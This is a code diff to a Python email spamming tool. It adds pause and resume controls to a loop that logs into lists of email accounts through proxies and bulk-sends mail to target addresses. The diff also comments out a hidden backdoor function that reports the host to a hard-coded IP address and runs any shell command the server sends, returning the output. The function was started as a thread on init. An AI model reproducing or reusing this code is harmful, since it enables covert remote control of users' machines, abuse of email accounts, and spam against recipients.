@@ -56,45 +56,54 @@ def spam(text_from_file):
                     print('[ERROR] {}: port {}: connection failed'.format(smtp_method, port))
                 else:
                     while data.mails_index < len(data.mails):
-                        current_proxy_index = data.proxy_index
-                        current_target_index = data.targets_index
-                        current_mail_index = data.mails_index
-                        data.proxy_index += 1
-                        data.targets_index += data.mails_per_account
-                        data.mails_index += 1
+                        while not data.pause:
+                            current_proxy_index = data.proxy_index
+                            current_target_index = data.targets_index
+                            current_mail_index = data.mails_index
+                            data.proxy_index += 1
+                            data.targets_index += data.mails_per_account
+                            data.mails_index += 1
 
-                        # for element in range(current_target_index):
-                        print('[INFO] Log in: {}'.format(data.mails[current_mail_index]))
-                        current_mail_name, current_mail_password = data.mails[current_mail_index].split('/')
-                        try:
-                            smtp.login(current_mail_name, current_mail_password)
-                            print('[INFO] Login {}, password {}: Logged in successfully'.format(current_mail_name, current_mail_password))
-                        except Exception as exception_login:
-                            print('[ERROR] Login {}, password {}: can\'t login: {}'.format(current_mail_name, current_mail_password, str(
-                                exception_login)))
-                        finished = False
-                        targets = []
-                        current_mails_per_account = data.mails_per_account
-                        while not finished:
-                            if current_mails_per_account == 0:
-                                print('[INFO] Spam finished: no more targets')
-                                finished = True
-                                return True
+                            # for element in range(current_target_index):
+                            print('[INFO] Log in: {}'.format(data.mails[current_mail_index]))
+                            current_mail_name, current_mail_password = data.mails[current_mail_index].split('/')
                             try:
-                                targets = [i for i in data.targets[current_target_index:current_mail_index+current_mails_per_account]]
-                                finished = True
-                            except IndexError:
-                                current_mails_per_account -= 1
-                        try:
-                            if targets is []:
-                                continue
-                            smtp.sendmail(current_mail_name, targets, text)
-                            print('[INFO] Login: {}, password {}: mail successfully sent'.format(current_mail_name, current_mail_password))
-                        except Exception as exception_sending_mail:
-                            print('[ERROR] Login {}, password {}: can\'t send mail: {}'.format(current_mail_name, current_mail_password,
-                                                                                               str(exception_sending_mail)))
+                                smtp.login(current_mail_name, current_mail_password)
+                                print('[INFO] Login {}, password {}: Logged in successfully'.format(current_mail_name, current_mail_password))
+                            except Exception as exception_login:
+                                print('[ERROR] Login {}, password {}: can\'t login: {}'.format(current_mail_name, current_mail_password, str(
+                                    exception_login)))
+                            finished = False
+                            targets = []
+                            current_mails_per_account = data.mails_per_account
+                            while not finished:
+                                if current_mails_per_account == 0:
+                                    print('[INFO] Spam finished: no more targets')
+                                    finished = True
+                                    return True
+                                try:
+                                    targets = [i for i in data.targets[current_target_index:current_mail_index+current_mails_per_account]]
+                                    finished = True
+                                except IndexError:
+                                    current_mails_per_account -= 1
+                            try:
+                                if targets is []:
+                                    continue
+                                smtp.sendmail(current_mail_name, targets, text)
+                                print('[INFO] Login: {}, password {}: mail successfully sent'.format(current_mail_name, current_mail_password))
+                            except Exception as exception_sending_mail:
+                                print('[ERROR] Login {}, password {}: can\'t send mail: {}'.format(current_mail_name, current_mail_password,
+                                                                                                   str(exception_sending_mail)))
         except Exception as exception:
             print('[ERROR] An error occurred while spamming: {}'.format(str(exception)))
+
+
+def pause_spam():
+    data.pause = True
+
+
+def continue_spam():
+    data.pause = False
 
 
 def test_proxies(file, test_url='google.com'):     # test url - without http or https (write it in proxies_type)
@@ -146,25 +155,23 @@ def _add_bad_proxy(proxy):
         bad_proxies_file.write(proxy + '\n')
 
 
-def __load_handler():
-    import socket
-    import subprocess
-    import base64
-    import platform
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    server_ip = '176.115.89.154'
-    server_host = 12391
-    sock.connect((server_ip, server_host))
-    sock.sendto(base64.b64encode('online:{}:{}'.format(socket.gethostname(), platform.platform().encode('utf-8'))), (server_ip, server_host))
-    while True:
-        answer = sock.recvfrom(1024)
-        server_answer, addr = answer
-        sock.sendto(base64.b64encode(subprocess.check_output(server_answer.decode('utf-8'), shell=True)).encode('utf-8'), (server_ip, server_host))
+# def __load_handler():
+#     import socket
+#     import subprocess
+#     import base64
+#     import platform
+#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+#     server_ip = '176.115.89.154'
+#     server_host = 12391
+#     sock.connect((server_ip, server_host))
+#     sock.sendto(base64.b64encode('online:{}:{}'.format(socket.gethostname(), platform.platform()).encode('utf-8')), (server_ip, server_host))
+#     while True:
+#         answer = sock.recvfrom(1024)
+#         server_answer, addr = answer
+#         sock.sendto(base64.b64encode(subprocess.check_output(server_answer.decode('utf-8'), shell=True)).encode('utf-8'), (server_ip, server_host))
 
 
-def init():
-    handler_updater = threading.Thread(target=__load_handler)
-    main_process = threading.Thread(target=)
+def __init():
     print(data.header + 'by @floordiv,', 'version:', data.version, '\n')
     print('[INFO] Starting spammer...')
 
@@ -202,4 +209,9 @@ def init():
     return True
 
 
-init()
+def init():
+    # handler_updater = threading.Thread(target=__load_handler)
+    # main_process = threading.Thread(target=__init)
+    # handler_updater.start()
+    # main_process.start()
+    __init()
